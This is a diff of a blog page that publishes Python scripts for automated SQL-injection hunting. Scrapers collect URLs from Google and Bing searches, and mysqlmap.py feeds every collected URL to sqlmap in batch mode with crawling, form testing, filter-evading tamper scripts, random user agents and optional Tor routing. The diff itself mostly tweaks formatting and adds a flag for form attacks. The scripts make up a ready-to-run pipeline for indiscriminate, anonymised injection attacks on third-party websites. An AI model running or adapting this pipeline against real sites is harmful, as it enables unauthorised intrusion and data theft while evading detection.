@@ -117,7 +117,7 @@
 
       <div class="read-time">
         <small>
-          46 minute read
+          52 minute read
         </small>
       </div>
 
@@ -247,7 +247,7 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 
 <p>1&gt;easy_search.py</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#need py3 coz GoogleScraper need py3 with selenium module changed to make it possible</span>
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c">#need py3 coz GoogleScraper need py3 with selenium module changed to make it possible</span>
 <span class="c">#to supass yanzhengma</span>
 <span class="c">#easy_search.py is stronger than combineGoogleScraper_myurlhandle.py</span>
 <span class="c">#coz the latter can get the http_url only while easy_search.py can get </span>
@@ -264,23 +264,40 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 <span class="c">#when you run easy_search.py,you need supply keyword for google search,</span>
 <span class="c">#then the result is those urls from this google search,the result file is </span>
 <span class="c">#GoogleScraper_origin_http_domain_url_list.txt. </span>
+<span class="c">#need py3 coz GoogleScraper need py3 with selenium module changed to make it possible</span>
+<span class="c">#to supass yanzhengma</span>
+<span class="c">#easy_search.py is stronger than combineGoogleScraper_myurlhandle.py</span>
+<span class="c">#coz the latter can get the http_url only while easy_search.py can get</span>
+<span class="c">#the three kinds of url_list and txt</span>
+<span class="c">#</span>
+<span class="c">#</span>
+<span class="c">##/root/myenv2/bin/python3.5m is the normal python3</span>
+<span class="c">#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python</span>
+<span class="c">#</span>
+<span class="c">#function:</span>
+<span class="c">#this script get the GoogleScraper_origin_http_domain_url_list.txt</span>
+<span class="c">#that is a file with urls which can be directly thrown into sqlmap to start</span>
+<span class="c">#dig sqli(s),and the urls are from google search,eg.</span>
+<span class="c">#when you run easy_search.py,you need supply keyword for google search,</span>
+<span class="c">#then the result is those urls from this google search,the result file is</span>
+<span class="c">#GoogleScraper_origin_http_domain_url_list.txt.</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="k">def</span> <span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">url_list</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
     <span class="nb">file</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="s">"a+"</span><span class="p">)</span>
-    <span class="nb">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>   
+    <span class="nb">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
     <span class="k">for</span> <span class="n">ur</span> <span class="ow">in</span> <span class="n">url_list</span><span class="p">:</span>
-        <span class="nb">file</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="s">"r+"</span><span class="p">)</span>  
+        <span class="nb">file</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="s">"r+"</span><span class="p">)</span>
         <span class="n">all_lines</span><span class="o">=</span><span class="nb">file</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
         <span class="k">print</span><span class="p">(</span><span class="n">all_lines</span><span class="p">)</span>
         <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">all_lines</span><span class="p">))</span>
         <span class="nb">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
         <span class="c">#if ur+"\r\n" not in all_lines:</span>
-        <span class="k">if</span> <span class="n">ur</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">all_lines</span><span class="p">:</span>          
+        <span class="k">if</span> <span class="n">ur</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">all_lines</span><span class="p">:</span>
             <span class="c">#print(type(ur))</span>
             <span class="c">#print(type("\r\n"))</span>
             <span class="c">#print(type(ur+"\r\n"))</span>
-            <span class="nb">file</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="s">"a+"</span><span class="p">)</span>        
+            <span class="nb">file</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="s">"a+"</span><span class="p">)</span>
             <span class="c">#print 11112212</span>
             <span class="k">print</span><span class="p">(</span><span class="n">ur</span><span class="p">)</span>
             <span class="nb">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ur</span><span class="o">+</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
@@ -296,7 +313,7 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 	<span class="n">method</span><span class="o">=</span><span class="s">'selenium'</span>
 	<span class="n">browser</span><span class="o">=</span><span class="s">'firefox'</span>
 	<span class="kn">from</span> <span class="nn">GoogleScraper</span> <span class="kn">import</span> <span class="n">scrape_with_config</span><span class="p">,</span> <span class="n">GoogleSearchError</span>
-	
+
 	<span class="c"># See in the config.cfg file for possible values</span>
 	<span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
 	    <span class="s">'use_own_ip'</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
@@ -307,31 +324,31 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 	    <span class="s">'sel_browser'</span><span class="p">:</span> <span class="n">browser</span><span class="p">,</span>
 	    <span class="s">'do_caching'</span><span class="p">:</span> <span class="bp">False</span>
 	<span class="p">}</span>
-	
+
 	<span class="k">try</span><span class="p">:</span>
 	    <span class="n">search</span> <span class="o">=</span> <span class="n">scrape_with_config</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>
 	    <span class="c">#print(11)</span>
 	<span class="k">except</span> <span class="n">GoogleSearchError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
 	    <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
-	
+
 	<span class="c"># let's inspect what we got</span>
 	<span class="s">'''
-	for serp in search.serps:    
+	for serp in search.serps:
 	    print(serp)
 	    print(serp.search_engine_name)
 	    print(serp.scrape_method)
 	    print(serp.page_number)
 	    print(serp.requested_at)
 	    print(serp.num_results)
-	    
+
 	    # ... more attributes ...
-	
+
 	    for link in serp.links:
 	        #link=link.split("&gt;")[]
 	        #print(type(link))
 	        print(link.link)
 	        all_urls.append(link.link)
-	'''</span>  
+	'''</span>
 	<span class="n">GoogleScraper_domain_list</span><span class="o">=</span><span class="p">[]</span>
 	<span class="n">GoogleScraper_http_domain_list</span><span class="o">=</span><span class="p">[]</span>
 	<span class="n">GoogleScraper_origin_http_domain_url_list</span><span class="o">=</span><span class="p">[]</span>
@@ -339,12 +356,12 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 
 	<span class="k">for</span> <span class="n">serp</span> <span class="ow">in</span> <span class="n">search</span><span class="o">.</span><span class="n">serps</span><span class="p">:</span>
 		<span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">serp</span><span class="o">.</span><span class="n">links</span><span class="p">:</span>
-			<span class="k">if</span> <span class="s">"https://"</span> <span class="ow">in</span> <span class="n">link</span><span class="o">.</span><span class="n">link</span><span class="p">:</span>            
+			<span class="k">if</span> <span class="s">"https://"</span> <span class="ow">in</span> <span class="n">link</span><span class="o">.</span><span class="n">link</span><span class="p">:</span>
 			    <span class="n">domain</span><span class="o">=</span><span class="p">(</span><span class="n">link</span><span class="o">.</span><span class="n">link</span><span class="p">)[</span><span class="mi">8</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'/'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
 			    <span class="c">#print("domain=(link.link)[8:-1].split('/')[0] is:")</span>
 			    <span class="c">#print(domain)</span>
-			    <span class="k">if</span> <span class="n">domain</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">GoogleScraper_domain_list</span><span class="p">:</span>   
-			    	<span class="n">GoogleScraper_domain_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>     
+			    <span class="k">if</span> <span class="n">domain</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">GoogleScraper_domain_list</span><span class="p">:</span>
+			    	<span class="n">GoogleScraper_domain_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
 			    	<span class="n">GoogleScraper_http_domain_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">"https://"</span><span class="o">+</span><span class="n">domain</span><span class="p">)</span>
 			    <span class="c">#attention!here is not the same from the bing_search_domin script,</span>
 			    <span class="c">#coz we need as much url as possible for sqlmap to try to exploit,</span>
@@ -355,7 +372,7 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 			    <span class="n">domain</span><span class="o">=</span><span class="p">(</span><span class="n">link</span><span class="o">.</span><span class="n">link</span><span class="p">)[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'/'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
 			    <span class="c">#print("domain=(link.link)[7:-1].split('/')[0] is:")</span>
 			    <span class="c">#print(domain)</span>
-			    <span class="k">if</span> <span class="n">domain</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">GoogleScraper_domain_list</span><span class="p">:</span>                
+			    <span class="k">if</span> <span class="n">domain</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">GoogleScraper_domain_list</span><span class="p">:</span>
 			        <span class="n">GoogleScraper_domain_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
 			        <span class="n">GoogleScraper_http_domain_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">"http://"</span><span class="o">+</span><span class="n">domain</span><span class="p">)</span>
 			    <span class="c">#attention!here is not the same from the bing_search_domin script,</span>
@@ -408,18 +425,26 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
 		<span class="n">usage</span><span class="p">()</span>
 	<span class="n">main</span><span class="p">()</span>
+
+
+
+
+
+
+
+
 </code></pre>
 </div>
 
 <p>2&gt;my_bing_domains_v1_alone.py</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code><span class="c"># -*- coding: utf-8 -*-</span>
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c"># -*- coding: utf-8 -*-</span>
 <span class="c">#need python2(my system is py2.7 by default)</span>
 <span class="c">#</span>
 <span class="c">#</span>
 <span class="c">##/root/myenv2/bin/python3.5m is the normal python3</span>
 <span class="c">#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python</span>
-<span class="c">#</span>
+
 <span class="kn">import</span> <span class="nn">urllib</span>
 <span class="kn">import</span> <span class="nn">urllib2</span>
 <span class="kn">import</span> <span class="nn">json</span>
@@ -589,7 +614,7 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 
 <span class="k">def</span> <span class="nf">bing_search</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">search_type</span><span class="p">):</span>
     <span class="c">#search_type: Web, Image, News, Video</span>
-    <span class="n">key</span><span class="o">=</span> <span class="s">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>
+    <span class="n">key</span><span class="o">=</span> <span class="s">'xxxxxxxxxx'</span>
     <span class="n">query</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
     <span class="c">#print "bing_search s query is %s" % query</span>
     <span class="c"># create credential for authentication</span>
@@ -625,7 +650,7 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 
 <p>3&gt;my_GoogleScraper_bing_domain.py</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#need python3 coz GoogleScraper require it.</span>
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c">#need python3 coz GoogleScraper require it.</span>
 <span class="c">#and python3 with GoogleScraper unchanged selenium version python environment,</span>
 <span class="c">#coz bing does not need supass yanzhengma</span>
 <span class="c">#on this computer is "workon virtualenv2"</span>
@@ -890,7 +915,7 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 
 <p>4&gt;mysqlmap.py</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#works in python 3(selenium changed version,that's myenv)</span>
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c">#works in python 3(selenium changed version,that's myenv)</span>
 <span class="c">#coz line53 &amp; line73 use a function from a py3 module,but</span>
 <span class="c">#that is not necessary</span>
 <span class="c">#in this script file in sqlmap_string,added --tor --tor-type=socks5 --check-tor ,</span>
@@ -906,7 +931,7 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 	<span class="c">#re.search("",url)</span>
 	<span class="k">pass</span>
 
-<span class="k">def</span> <span class="nf">sqlmap_g_nohuman</span><span class="p">(</span><span class="n">http_url_or_file</span><span class="p">,</span><span class="n">tor_or_not</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">sqlmap_g_nohuman</span><span class="p">(</span><span class="n">http_url_or_file</span><span class="p">,</span><span class="n">tor_or_not</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">):</span>
 	<span class="c">#this function use sqlmap's "-g" option to find sqli urls,but this "-g"</span>
 	<span class="c">#option can only get 100 results due to google api restriction,but in </span>
 	<span class="c">#this mode,there is no need for us human to handle any situation.</span>
@@ -922,12 +947,14 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 			<span class="k">print</span><span class="p">(</span><span class="s">"sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
 			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
+			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
 		<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"tor_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"tor_forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
+			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 
 	<span class="k">else</span><span class="p">:</span>
 		<span class="n">fp</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">http_url_or_file</span><span class="p">,</span><span class="s">"r+"</span><span class="p">)</span>
@@ -945,14 +972,17 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 				<span class="k">print</span><span class="p">(</span><span class="s">"sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
 				<span class="k">print</span><span class="p">(</span><span class="s">"forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
 				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
-				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
+				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
+
 			<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
 				<span class="k">print</span><span class="p">(</span><span class="s">"tor_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
 				<span class="k">print</span><span class="p">(</span><span class="s">"tor_forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
-				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
+				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">sqlmap_craw</span><span class="p">(</span><span class="n">origin_http_url_or_file</span><span class="p">,</span><span class="n">tor_or_not</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">sqlmap_craw</span><span class="p">(</span><span class="n">origin_http_url_or_file</span><span class="p">,</span><span class="n">tor_or_not</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">):</span>
 	<span class="c">#this function use sqlmap's "--crawl" option to find sqli urls.</span>
 	<span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="s">"(http://)|(https://)"</span><span class="p">,</span><span class="n">origin_http_url_or_file</span><span class="p">):</span>
 		<span class="n">origin_http_url</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r'(</span><span class="err">\</span><span class="s">s)'</span><span class="p">,</span><span class="s">""</span><span class="p">,</span><span class="n">origin_http_url_or_file</span><span class="p">)</span>
@@ -965,17 +995,20 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 			<span class="k">print</span><span class="p">(</span><span class="s">"sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
 			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
+			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
+			
 		<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"tor_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"tor_forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
+			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
 		<span class="n">fp</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">origin_http_url_or_file</span><span class="p">,</span><span class="s">"r+"</span><span class="p">)</span>
 		<span class="n">all_urls</span><span class="o">=</span><span class="n">fp</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
 		<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-		<span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">all_urls</span><span class="p">:</span>	
+		<span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">all_urls</span><span class="p">:</span>
 			<span class="n">origin_http_url</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r'(</span><span class="err">\</span><span class="s">s)'</span><span class="p">,</span><span class="s">""</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>		
 			<span class="n">sqlmap_string</span><span class="o">=</span><span class="s">'''/usr/share/sqlmap/sqlmap.py -u "</span><span class="si">%</span><span class="s">s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "</span><span class="si">%</span><span class="s">s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">origin_http_url</span><span class="p">,</span><span class="n">origin_http_url</span><span class="p">)</span>
 			<span class="n">forms_sqlmap_string</span><span class="o">=</span><span class="s">'''/usr/share/sqlmap/sqlmap.py -u "</span><span class="si">%</span><span class="s">s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "</span><span class="si">%</span><span class="s">s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">origin_http_url</span><span class="p">,</span><span class="n">origin_http_url</span><span class="p">)</span>
@@ -986,15 +1019,17 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 				<span class="k">print</span><span class="p">(</span><span class="s">"sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
 				<span class="k">print</span><span class="p">(</span><span class="s">"forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
 				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
-				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
+				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
 			<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
 				<span class="k">print</span><span class="p">(</span><span class="s">"tor_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
 				<span class="k">print</span><span class="p">(</span><span class="s">"tor_forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
-				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
+				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 
 
-<span class="k">def</span> <span class="nf">sqlmap_g_human</span><span class="p">(</span><span class="n">http_url_or_file</span><span class="p">,</span><span class="n">tor_or_not</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">sqlmap_g_human</span><span class="p">(</span><span class="n">http_url_or_file</span><span class="p">,</span><span class="n">tor_or_not</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">):</span>
 	<span class="c">#this function use myGoogleScraper to search google dork to get the full</span>
 	<span class="c">#urls,in this mode,we need input the yanchengma by human,not robot,coz </span>
 	<span class="c">#sqlmap's -g option can only get the former 100 results,this function will</span>
@@ -1015,12 +1050,14 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 			<span class="k">print</span><span class="p">(</span><span class="s">"sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
 			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
+			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
 		<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"tor_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
